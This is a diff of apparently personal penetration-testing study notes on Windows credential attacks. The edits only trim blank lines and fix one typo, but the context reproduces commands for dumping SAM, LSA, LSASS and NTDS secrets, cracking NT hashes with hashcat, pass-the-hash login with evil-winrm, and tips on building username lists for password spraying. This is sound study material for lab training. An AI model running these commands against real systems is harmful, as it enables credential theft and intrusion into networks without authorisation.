@@ -26,7 +26,6 @@ crackmapexec smb <ip> --local-auth -u <user> -p <pass> --lsa
 ```shell
 crackmapexec smb <ip> --local-auth -u <user> -p <password> --sam
 ```
-
 #### Cracking SAM
 ```shell
 impacket-secretsdump -sam <sam file> -security <security file> -system <system file> LOCAL
@@ -35,8 +34,6 @@ impacket-secretsdump -sam <sam file> -security <security file> -system <system f
 ```shell
 sudo hashcat -m 1000 <NT Hashes> /usr/share/wordlists/rockyou.txt
 ```
-
-
 
 ## Attacking LSASS
 ![[WinLogon.png]]
@@ -67,8 +64,6 @@ Create LSASS.dmp
 ```powershell
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> C:\lsass.dmp full
 ```
-
-
 #### Extract LSASS Credentials 
  
 ##### Pypykatz
@@ -77,7 +72,7 @@ pypykatz lsa minidump lsass.dmp
 ```
 ###### [MSV](https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package)
 
-Authentication package in windows that LSA validates logon attemps against the SAM database, 
+Authentication package in windows that LSA validates logon attempts against the SAM database, 
 ###### WDIGEST
 
 Older authentication methods protocol enabled by default Win XP - Win 8  and Server 2003 - 2012
@@ -110,7 +105,6 @@ Need initial foothold on the network
 Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests.
 
 [Attack technique](https://attack.mitre.org/techniques/T1003/003/)
-
 #### Dictionary Attacks 
 
 Very noisy 
@@ -127,7 +121,6 @@ Using Emails:
 	We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn’t disclosed, making password spraying harder. Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.
 
 Create usernames with [Username anarchy](https://github.com/urbanadventurer/username-anarchy)
-
 #### Target the Domain Controller
 Attempt to establish username and password
 ```shell
@@ -162,8 +155,6 @@ cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTD
 ```shell
 crackmapexec smb <ip> -u <user> -p <password> --ntds
 ```
-
-
 #### Pass the hash
 ```shell
 evil-winrm -i <ip> -u <user> -H "<hash>"
